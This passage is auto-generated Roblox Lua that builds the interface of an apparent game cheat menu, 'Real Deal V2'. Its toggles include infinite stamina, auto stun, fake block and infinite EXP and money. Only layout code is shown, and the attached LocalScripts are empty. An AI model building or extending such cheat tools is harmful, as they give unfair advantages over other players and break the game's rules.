G2L["c8"]["Position"] = UDim2.new(0.25719, 0, 1.89341, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaLoss.TextButton.LocalScript
G2L["c9"] = Instance.new("LocalScript", G2L["c8"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaLoss.TextButton.UICorner
G2L["ca"] = Instance.new("UICorner", G2L["c8"]);
G2L["ca"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaLoss.TextButton.UIStroke
G2L["cb"] = Instance.new("UIStroke", G2L["c8"]);
G2L["cb"]["Thickness"] = 3.3;
G2L["cb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaLoss.TextBox
G2L["cc"] = Instance.new("TextBox", G2L["c7"]);
G2L["cc"]["BorderSizePixel"] = 0;
G2L["cc"]["TextWrapped"] = true;
G2L["cc"]["TextSize"] = 14;
G2L["cc"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cc"]["TextScaled"] = true;
G2L["cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cc"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["cc"]["Size"] = UDim2.new(1.07374, 0, 0.69031, 0);
G2L["cc"]["Position"] = UDim2.new(-0.02668, 0, 1, 0);
G2L["cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cc"]["Text"] = [[Default 10]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaLoss.TextBox.UICorner
G2L["cd"] = Instance.new("UICorner", G2L["cc"]);
G2L["cd"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaLoss.TextBox.UIStroke
G2L["ce"] = Instance.new("UIStroke", G2L["cc"]);
G2L["ce"]["Thickness"] = 3.3;
G2L["ce"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MaxStamina
G2L["cf"] = Instance.new("TextLabel", G2L["b6"]);
G2L["cf"]["TextWrapped"] = true;
G2L["cf"]["BorderSizePixel"] = 0;
G2L["cf"]["TextSize"] = 24;
G2L["cf"]["TextScaled"] = true;
G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cf"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["BackgroundTransparency"] = 1;
G2L["cf"]["RichText"] = true;
G2L["cf"]["Size"] = UDim2.new(0.42722, 0, 0.123, 0);
G2L["cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["Text"] = [[Set Max Stamina]];
G2L["cf"]["Name"] = [[MaxStamina]];
G2L["cf"]["Position"] = UDim2.new(0.01878, 0, 0.02999, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MaxStamina.TextButton
G2L["d0"] = Instance.new("TextButton", G2L["cf"]);
G2L["d0"]["TextWrapped"] = true;
G2L["d0"]["BorderSizePixel"] = 0;
G2L["d0"]["TextSize"] = 99;
G2L["d0"]["TextScaled"] = true;
G2L["d0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d0"]["BackgroundColor3"] = Color3.fromRGB(96, 96, 96);
G2L["d0"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["d0"]["Size"] = UDim2.new(0.49352, 0, 0.67058, 0);
G2L["d0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d0"]["Text"] = [[Press Me After]];
G2L["d0"]["Position"] = UDim2.new(0.25719, 0, 1.89341, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MaxStamina.TextButton.LocalScript
G2L["d1"] = Instance.new("LocalScript", G2L["d0"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MaxStamina.TextButton.UICorner
G2L["d2"] = Instance.new("UICorner", G2L["d0"]);
G2L["d2"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MaxStamina.TextButton.UIStroke
G2L["d3"] = Instance.new("UIStroke", G2L["d0"]);
G2L["d3"]["Thickness"] = 3.3;
G2L["d3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MaxStamina.TextBox
G2L["d4"] = Instance.new("TextBox", G2L["cf"]);
G2L["d4"]["BorderSizePixel"] = 0;
G2L["d4"]["TextWrapped"] = true;
G2L["d4"]["TextSize"] = 14;
G2L["d4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d4"]["TextScaled"] = true;
G2L["d4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d4"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["d4"]["Size"] = UDim2.new(1.07374, 0, 0.69031, 0);
G2L["d4"]["Position"] = UDim2.new(-0.02668, 0, 1, 0);
G2L["d4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d4"]["Text"] = [[Default 100]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MaxStamina.TextBox.UICorner
G2L["d5"] = Instance.new("UICorner", G2L["d4"]);
G2L["d5"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MaxStamina.TextBox.UIStroke
G2L["d6"] = Instance.new("UIStroke", G2L["d4"]);
G2L["d6"]["Thickness"] = 3.3;
G2L["d6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.Inf Stamina
G2L["d7"] = Instance.new("TextLabel", G2L["b6"]);
G2L["d7"]["TextWrapped"] = true;
G2L["d7"]["BorderSizePixel"] = 0;
G2L["d7"]["TextSize"] = 24;
G2L["d7"]["TextScaled"] = true;
G2L["d7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d7"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d7"]["BackgroundTransparency"] = 1;
G2L["d7"]["RichText"] = true;
G2L["d7"]["Size"] = UDim2.new(0.42722, 0, 0.123, 0);
G2L["d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d7"]["Text"] = [[Infinite stamina]];
G2L["d7"]["Name"] = [[Inf Stamina]];
G2L["d7"]["Position"] = UDim2.new(0.30816, 0, 0.75753, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.Inf Stamina.ImageButton
G2L["d8"] = Instance.new("ImageButton", G2L["d7"]);
G2L["d8"]["BorderSizePixel"] = 0;
G2L["d8"]["BackgroundTransparency"] = 1;
G2L["d8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d8"]["Image"] = [[rbxassetid://76864339841735]];
G2L["d8"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["d8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d8"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["d8"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.Inf Stamina.ImageButton.LocalScript
G2L["d9"] = Instance.new("LocalScript", G2L["d8"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.Inf Stamina.ImageButton.UICorner
G2L["da"] = Instance.new("UICorner", G2L["d8"]);
G2L["da"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra
G2L["db"] = Instance.new("Frame", G2L["6b"]);
G2L["db"]["Visible"] = false;
G2L["db"]["BorderSizePixel"] = 0;
G2L["db"]["BackgroundColor3"] = Color3.fromRGB(28, 138, 148);
G2L["db"]["Size"] = UDim2.new(0.99982, 0, 0.85028, 0);
G2L["db"]["Position"] = UDim2.new(0, 0, 0.08711, 0);
G2L["db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["db"]["Name"] = [[Extra]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.AutoStun
G2L["dc"] = Instance.new("TextLabel", G2L["db"]);
G2L["dc"]["TextWrapped"] = true;
G2L["dc"]["BorderSizePixel"] = 0;
G2L["dc"]["TextSize"] = 24;
G2L["dc"]["TextScaled"] = true;
G2L["dc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dc"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["dc"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["dc"]["BackgroundTransparency"] = 1;
G2L["dc"]["RichText"] = true;
G2L["dc"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["dc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["dc"]["Text"] = [[Auto Stun ]];
G2L["dc"]["Name"] = [[AutoStun]];
G2L["dc"]["Position"] = UDim2.new(-0.00441, 0, 0.03464, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.AutoStun.ImageButton
G2L["dd"] = Instance.new("ImageButton", G2L["dc"]);
G2L["dd"]["BorderSizePixel"] = 0;
G2L["dd"]["BackgroundTransparency"] = 1;
G2L["dd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dd"]["Image"] = [[rbxassetid://76864339841735]];
G2L["dd"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["dd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["dd"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["dd"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.AutoStun.ImageButton.LocalScript
G2L["de"] = Instance.new("LocalScript", G2L["dd"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.AutoStun.ImageButton.UICorner
G2L["df"] = Instance.new("UICorner", G2L["dd"]);
G2L["df"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Fake Block
G2L["e0"] = Instance.new("TextLabel", G2L["db"]);
G2L["e0"]["TextWrapped"] = true;
G2L["e0"]["BorderSizePixel"] = 0;
G2L["e0"]["TextSize"] = 24;
G2L["e0"]["TextScaled"] = true;
G2L["e0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e0"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e0"]["BackgroundTransparency"] = 1;
G2L["e0"]["RichText"] = true;
G2L["e0"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["e0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e0"]["Text"] = [[Fake Block]];
G2L["e0"]["Name"] = [[Fake Block]];
G2L["e0"]["Position"] = UDim2.new(0.49469, 0, 0.0255, 0);
-- Attributes
G2L["e0"]:SetAttribute([[Animation]], [[rbxassetid://95802026624883]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Fake Block.ImageButton
G2L["e1"] = Instance.new("ImageButton", G2L["e0"]);
G2L["e1"]["BorderSizePixel"] = 0;
G2L["e1"]["BackgroundTransparency"] = 1;
G2L["e1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e1"]["Image"] = [[rbxassetid://76864339841735]];
G2L["e1"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["e1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e1"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["e1"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Fake Block.ImageButton.LocalScript
G2L["e2"] = Instance.new("LocalScript", G2L["e1"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Fake Block.ImageButton.UICorner
G2L["e3"] = Instance.new("UICorner", G2L["e1"]);
G2L["e3"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector
G2L["e4"] = Instance.new("Folder", G2L["db"]);
G2L["e4"]["Name"] = [[FakeBlockSelector]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.Block Guest
G2L["e5"] = Instance.new("ImageButton", G2L["e4"]);
G2L["e5"]["BorderSizePixel"] = 0;
G2L["e5"]["BackgroundTransparency"] = 1;
G2L["e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e5"]["Image"] = [[rbxassetid://134295878119246]];
G2L["e5"]["Size"] = UDim2.new(0.0655, 0, 0.06516, 0);
G2L["e5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e5"]["Name"] = [[Block Guest]];
G2L["e5"]["Position"] = UDim2.new(0.1551, 0, 0.34007, 0);
-- Attributes
G2L["e5"]:SetAttribute([[Checked]], true);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.Block Guest.LocalScript
G2L["e6"] = Instance.new("LocalScript", G2L["e5"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.Block Guest.TextLabel
G2L["e7"] = Instance.new("TextLabel", G2L["e5"]);
G2L["e7"]["TextWrapped"] = true;
G2L["e7"]["BorderSizePixel"] = 0;
G2L["e7"]["TextSize"] = 14;
G2L["e7"]["TextScaled"] = true;
G2L["e7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e7"]["Size"] = UDim2.new(3.62387, 0, 0.85714, 0);
G2L["e7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e7"]["Text"] = [[Block Guest]];
G2L["e7"]["Position"] = UDim2.new(-1.31703, 0, -0.95369, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.Block Guest.TextLabel.UICorner
G2L["e8"] = Instance.new("UICorner", G2L["e7"]);
G2L["e8"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.Block Guest.UICorner
G2L["e9"] = Instance.new("UICorner", G2L["e5"]);
G2L["e9"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M2-
G2L["ea"] = Instance.new("ImageButton", G2L["e4"]);
G2L["ea"]["BorderSizePixel"] = 0;
G2L["ea"]["BackgroundTransparency"] = 1;
G2L["ea"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ea"]["Image"] = [[rbxassetid://72082883979213]];
G2L["ea"]["Size"] = UDim2.new(0.0655, 0, 0.06516, 0);
G2L["ea"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ea"]["Name"] = [[M2-]];
G2L["ea"]["Position"] = UDim2.new(0.45814, 0, 0.34007, 0);
-- Attributes
G2L["ea"]:SetAttribute([[Checked]], false);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M2-.LocalScript
G2L["eb"] = Instance.new("LocalScript", G2L["ea"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M2-.TextLabel
G2L["ec"] = Instance.new("TextLabel", G2L["ea"]);
G2L["ec"]["TextWrapped"] = true;
G2L["ec"]["BorderSizePixel"] = 0;
G2L["ec"]["TextSize"] = 14;
G2L["ec"]["TextScaled"] = true;
G2L["ec"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ec"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ec"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ec"]["Size"] = UDim2.new(3.62387, 0, 0.85714, 0);
G2L["ec"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ec"]["Text"] = [[Normal Guest]];
G2L["ec"]["Position"] = UDim2.new(-1.17318, 0, -0.95369, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M2-.TextLabel.UICorner
G2L["ed"] = Instance.new("UICorner", G2L["ec"]);
G2L["ed"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M2-.UICorner
G2L["ee"] = Instance.new("UICorner", G2L["ea"]);
G2L["ee"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M3+
G2L["ef"] = Instance.new("ImageButton", G2L["e4"]);
G2L["ef"]["BorderSizePixel"] = 0;
G2L["ef"]["BackgroundTransparency"] = 1;
G2L["ef"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ef"]["Image"] = [[rbxassetid://72082883979213]];
G2L["ef"]["Size"] = UDim2.new(0.0655, 0, 0.06516, 0);
G2L["ef"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ef"]["Name"] = [[M3+]];
G2L["ef"]["Position"] = UDim2.new(0.80272, 0, 0.34007, 0);
-- Attributes
G2L["ef"]:SetAttribute([[Checked]], false);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M3+.LocalScript
G2L["f0"] = Instance.new("LocalScript", G2L["ef"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M3+.TextLabel
G2L["f1"] = Instance.new("TextLabel", G2L["ef"]);
G2L["f1"]["TextWrapped"] = true;
G2L["f1"]["BorderSizePixel"] = 0;
G2L["f1"]["TextSize"] = 14;
G2L["f1"]["TextScaled"] = true;
G2L["f1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f1"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f1"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f1"]["Size"] = UDim2.new(3.62387, 0, 0.85714, 0);
G2L["f1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f1"]["Text"] = [[M3+ Guest]];
G2L["f1"]["Position"] = UDim2.new(-1.32802, 0, -0.95369, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M3+.TextLabel.UICorner
G2L["f2"] = Instance.new("UICorner", G2L["f1"]);
G2L["f2"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M3+.UICorner
G2L["f3"] = Instance.new("UICorner", G2L["ef"]);
G2L["f3"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Rejoin
G2L["f4"] = Instance.new("TextLabel", G2L["db"]);
G2L["f4"]["TextWrapped"] = true;
G2L["f4"]["BorderSizePixel"] = 0;
G2L["f4"]["TextSize"] = 24;
G2L["f4"]["TextScaled"] = true;
G2L["f4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f4"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f4"]["BackgroundTransparency"] = 1;
G2L["f4"]["RichText"] = true;
G2L["f4"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["f4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f4"]["Text"] = [[Rejoin]];
G2L["f4"]["Name"] = [[Rejoin]];
G2L["f4"]["Position"] = UDim2.new(-0.00295, 0, 0.43806, 0);
-- Attributes
G2L["f4"]:SetAttribute([[SigmaMode]], false);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Rejoin.ImageButton
G2L["f5"] = Instance.new("ImageButton", G2L["f4"]);
G2L["f5"]["BorderSizePixel"] = 0;
G2L["f5"]["BackgroundTransparency"] = 1;
G2L["f5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f5"]["Image"] = [[rbxassetid://76864339841735]];
G2L["f5"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["f5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f5"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["f5"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Rejoin.ImageButton.LocalScript
G2L["f6"] = Instance.new("LocalScript", G2L["f5"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Rejoin.ImageButton.UICorner
G2L["f7"] = Instance.new("UICorner", G2L["f5"]);
G2L["f7"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector
G2L["f8"] = Instance.new("Folder", G2L["db"]);
G2L["f8"]["Name"] = [[VeeThingySelector]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Obi mode
G2L["f9"] = Instance.new("ImageButton", G2L["f8"]);
G2L["f9"]["BorderSizePixel"] = 0;
G2L["f9"]["BackgroundTransparency"] = 1;
G2L["f9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f9"]["Image"] = [[rbxassetid://134295878119246]];
G2L["f9"]["Size"] = UDim2.new(0.09421, 0, 0.09373, 0);
G2L["f9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f9"]["Name"] = [[Obi mode]];
G2L["f9"]["Position"] = UDim2.new(0.16148, 0, 0.7685, 0);
-- Attributes
G2L["f9"]:SetAttribute([[Checked]], true);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Obi mode.LocalScript
G2L["fa"] = Instance.new("LocalScript", G2L["f9"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Obi mode.TextLabel
G2L["fb"] = Instance.new("TextLabel", G2L["f9"]);
G2L["fb"]["TextWrapped"] = true;
G2L["fb"]["BorderSizePixel"] = 0;
G2L["fb"]["TextSize"] = 14;
G2L["fb"]["TextScaled"] = true;
G2L["fb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fb"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["fb"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fb"]["Size"] = UDim2.new(3.62387, 0, 0.85714, 0);
G2L["fb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fb"]["Text"] = [[Obvious Mode]];
G2L["fb"]["Position"] = UDim2.new(-1.31703, 0, -0.95369, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Obi mode.TextLabel.UICorner
G2L["fc"] = Instance.new("UICorner", G2L["fb"]);
G2L["fc"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Obi mode.UICorner
G2L["fd"] = Instance.new("UICorner", G2L["f9"]);
G2L["fd"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Skilled Sigma Mode {67?}
G2L["fe"] = Instance.new("ImageButton", G2L["f8"]);
G2L["fe"]["BorderSizePixel"] = 0;
G2L["fe"]["BackgroundTransparency"] = 1;
G2L["fe"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fe"]["Image"] = [[rbxassetid://72082883979213]];
G2L["fe"]["Size"] = UDim2.new(0.09421, 0, 0.09373, 0);
G2L["fe"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fe"]["Name"] = [[Skilled Sigma Mode {67?}]];
G2L["fe"]["Position"] = UDim2.new(0.65911, 0, 0.7685, 0);
-- Attributes
G2L["fe"]:SetAttribute([[Checked]], false);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Skilled Sigma Mode {67?}.LocalScript
G2L["ff"] = Instance.new("LocalScript", G2L["fe"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Skilled Sigma Mode {67?}.TextLabel
G2L["100"] = Instance.new("TextLabel", G2L["fe"]);
G2L["100"]["TextWrapped"] = true;
G2L["100"]["BorderSizePixel"] = 0;
G2L["100"]["TextSize"] = 14;
G2L["100"]["TextScaled"] = true;
G2L["100"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["100"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["100"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["100"]["Size"] = UDim2.new(3.62387, 0, 0.85714, 0);
G2L["100"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["100"]["Text"] = [[Skill/Hard Mode]];
G2L["100"]["Position"] = UDim2.new(-1.31703, 0, -0.95369, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Skilled Sigma Mode {67?}.TextLabel.UICorner
G2L["101"] = Instance.new("UICorner", G2L["100"]);
G2L["101"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Skilled Sigma Mode {67?}.UICorner
G2L["102"] = Instance.new("UICorner", G2L["fe"]);
G2L["102"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Vee Thingy
G2L["103"] = Instance.new("TextLabel", G2L["db"]);
G2L["103"]["TextWrapped"] = true;
G2L["103"]["BorderSizePixel"] = 0;
G2L["103"]["TextSize"] = 24;
G2L["103"]["TextScaled"] = true;
G2L["103"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["103"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["103"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["103"]["BackgroundTransparency"] = 1;
G2L["103"]["RichText"] = true;
G2L["103"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["103"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["103"]["Text"] = [[Veeronica Inf EXP + Money]];
G2L["103"]["Name"] = [[Vee Thingy]];
G2L["103"]["Position"] = UDim2.new(0.49189, 0, 0.43806, 0);
-- Attributes
G2L["103"]:SetAttribute([[SigmaMode]], false);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Vee Thingy.ImageButton
G2L["104"] = Instance.new("ImageButton", G2L["103"]);
G2L["104"]["BorderSizePixel"] = 0;
G2L["104"]["BackgroundTransparency"] = 1;
G2L["104"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["104"]["Image"] = [[rbxassetid://76864339841735]];
G2L["104"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["104"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["104"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["104"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Vee Thingy.ImageButton.LocalScript
G2L["105"] = Instance.new("LocalScript", G2L["104"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Vee Thingy.ImageButton.UICorner
G2L["106"] = Instance.new("UICorner", G2L["104"]);
G2L["106"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About
G2L["107"] = Instance.new("Frame", G2L["6b"]);
G2L["107"]["Visible"] = false;
G2L["107"]["BorderSizePixel"] = 0;
G2L["107"]["BackgroundColor3"] = Color3.fromRGB(28, 138, 148);
